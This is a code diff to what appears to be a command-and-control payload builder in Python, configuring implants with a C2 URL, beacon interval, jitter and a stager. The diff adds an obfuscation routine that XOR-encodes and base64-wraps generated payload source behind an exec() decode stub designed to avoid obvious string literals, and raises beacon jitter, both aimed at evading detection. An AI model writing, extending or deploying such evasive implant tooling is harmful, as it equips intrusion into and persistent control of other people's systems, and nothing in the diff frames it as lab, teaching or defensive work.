@@ -68,6 +68,8 @@ Usage (Python API)
 from __future__ import annotations
 
 import argparse
+import base64
+import os
 import shlex
 import socket
 import subprocess
@@ -87,7 +89,7 @@ class PayloadConfig:
 
     c2_url: str
     interval: int = 5
-    jitter: float = 0.1
+    jitter: float = 0.3
     template: str = "http_python"
     # Shell command run after writing source to disk.
     # {output}  → the source file path
@@ -95,6 +97,8 @@ class PayloadConfig:
     post_build: str = ""
     # Extra key-value pairs passed through as additional tokens.
     extra_tokens: dict[str, str] = field(default_factory=dict)
+    # When True, XOR+base64-wrap the generated source with a random key.
+    obfuscate: bool = False
 
     def tokens(self) -> dict[str, str]:
         """Return the complete token → substitution-value mapping."""
@@ -158,15 +162,39 @@ class Builder:
             source = source.replace(token, value)
         return source
 
+    @staticmethod
+    def _obfuscate(source: str) -> str:
+        """XOR+base64-wrap source with a random key and return a decode stub.
+
+        The output is a self-contained Python one-liner that decodes and
+        exec()s the original source at runtime. No third-party dependencies.
+        """
+        key = os.urandom(16)
+        src_bytes = source.encode("utf-8")
+        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(src_bytes))
+        encoded = base64.b64encode(xored).decode()
+        # Compact decode stub — avoids obvious string literals
+        stub = (
+            "import base64 as _b\n"
+            f"_k = {list(key)!r}\n"
+            f"exec(bytes(v ^ _k[i % len(_k)] for i, v in"
+            f" enumerate(_b.b64decode(b'{encoded}'))))\n"
+        )
+        return stub
+
     def build(self, config: PayloadConfig) -> str:
         """Load a named template and substitute all tokens.
 
         Returns the configured payload source as a string.
+        If config.obfuscate is True, wraps the result in a XOR+b64 decode stub.
         Raises FileNotFoundError if the template does not exist.
         """
         path = self.template_path(config.template)
         source = path.read_text(encoding="utf-8")
-        return self._substitute(source, config)
+        source = self._substitute(source, config)
+        if config.obfuscate:
+            source = self._obfuscate(source)
+        return source
 
     def build_stager(self, c2_url: str) -> str:
         """Build the stager with C2 URL substituted.
